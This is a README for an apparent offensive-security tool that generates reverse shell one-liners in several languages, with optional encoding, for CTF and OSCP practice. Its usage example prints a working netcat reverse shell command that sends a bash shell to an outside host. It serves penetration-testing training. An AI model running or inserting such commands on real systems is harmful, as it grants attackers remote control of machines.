# RevShells


RevShell is a Python-based tool that was built to have a variety of shells all in one place. This project was created to be used in CTFs and OSCP in mind. This tool allow users to choose from a list of reverse shells such as bash, netcat, ncat, lua, powershell, ruby, perl, java, and python. RevShells can encode these shells with URL encoding and base64.

## Usage
  `python3 revshells.py -h`  
  will open a help menu, which will show you the needed syntax.

  ex:
      `python3 revshells.py -l or python3 revshells.py --list`  
  will give you a list of the shells that are available at the moment.   
        Once you see a shell you want, use -t or --type and the shell name to invoke it.
  
  `python3 revshells.py -i 1.1.1.1 -p 443 -t bash`  
    output: `nc -e /bin/bash 1.1.1.1 443`

 `--encode or -e` is entirely optional.  
 Your revshell will look like the above output if you do not use it.  
 URL encoding and base64 encoding were kept in mind and have been tested.
  
## Commands
    options:
    -h or --help: Display available commands and their functionalities.
    options:
    -i or --ip: your IP address
    -p or --port: your port 
    -t or --type: Shell type to generate
    -l or --list: List all available shell types
    -a or --all: Generate all shell types
    -e or  --encode: Encode payload (base64 or url) this one is optional.
                        


Installation Instructions

To use the Rev-Shell tool, follow these steps:  
Clone the Repository:

    git clone https://github.com/DelaDirty/RevShells.git  

Navigate to the Directory:

    cd RevShells



# Disclaimer
This tool is intended for educational and testing purposes only. Misuse of this tool for unauthorized access to systems or networks is strictly prohibited. The developers of this tool are not responsible for any illegal or unethical use of the tool






